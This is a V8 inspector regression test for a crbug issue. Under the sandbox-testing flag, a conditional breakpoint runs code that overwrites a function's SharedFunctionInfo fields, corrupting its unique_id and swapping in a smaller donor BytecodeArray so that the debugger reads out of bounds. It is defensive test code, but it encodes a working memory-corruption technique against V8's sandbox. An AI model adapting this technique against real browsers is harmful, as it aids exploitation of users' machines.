// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const {session, contextGroup, Protocol} =
    InspectorTest.start('Regression test for crbug.com/590064409.');

// Build a victim function with a large (~420KB) BytecodeArray so the breakpoint
// target sits at a large bytecode offset.
const kLongStmt = 'x=' + Array(2000).fill('x').join('+') + ';\n';
const kFillerLines = 35;
const kTargetLine = 3 + kFillerLines + 1;
contextGroup.addScript(
    `function victim(flag) {
  let x = 0;
  if (flag) {
${kLongStmt.repeat(kFillerLines)}  }
  x = 42;
  return x;
}`,
    0, 0, 'victim.js');

contextGroup.addScript(`
const kLongStmt = ${JSON.stringify(kLongStmt)};
let keep_alive = null;

// Runs inside Debug::Break() -> CheckBreakPoints() -> DebugEvaluate::Local().
function corrupt() {
  // Allocate a smaller (~144KB) BytecodeArray in TrustedLargeObjectSpace after
  // victim and its debug copy so it sits adjacent to unmapped memory.
  const donor = new Function(
      'flag',
      'let x = 0;\\nif (flag) {\\n' + kLongStmt.repeat(12) + '}\\nreturn x;\\n');
  donor(false);
  keep_alive = donor;

  const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  const sfiType = Sandbox.getInstanceTypeIdFor('SHARED_FUNCTION_INFO_TYPE');
  const kUniqueIdOffset = Sandbox.getFieldOffset(sfiType, 'unique_id');
  const kTrustedDataOffset =
      Sandbox.getFieldOffset(sfiType, 'trusted_function_data');

  const victimSfi =
      Sandbox.readObjectField(victim, 'shared_function_info') - 1;
  const donorSfi =
      Sandbox.readObjectField(donor, 'shared_function_info') - 1;

  // Corrupt victim's unique_id so TryGetDebugInfo() misses and swap its
  // trusted_function_data to donor's smaller BytecodeArray.
  memory.setInt32(victimSfi + kUniqueIdOffset, 0x13371337, true);
  const donorData = memory.getUint32(donorSfi + kTrustedDataOffset, true);
  memory.setUint32(victimSfi + kTrustedDataOffset, donorData, true);
  return true;
}
`);

(async () => {
  await Protocol.Debugger.enable();
  await Protocol.Debugger.setBreakpointByUrl({
    url: 'victim.js',
    lineNumber: kTargetLine,
    columnNumber: 0,
    condition: 'corrupt()',
  });
  Protocol.Debugger.onPaused(() => Protocol.Debugger.resume());
  await Protocol.Runtime.evaluate({expression: 'victim(false)'});
  InspectorTest.completeTest();
})();
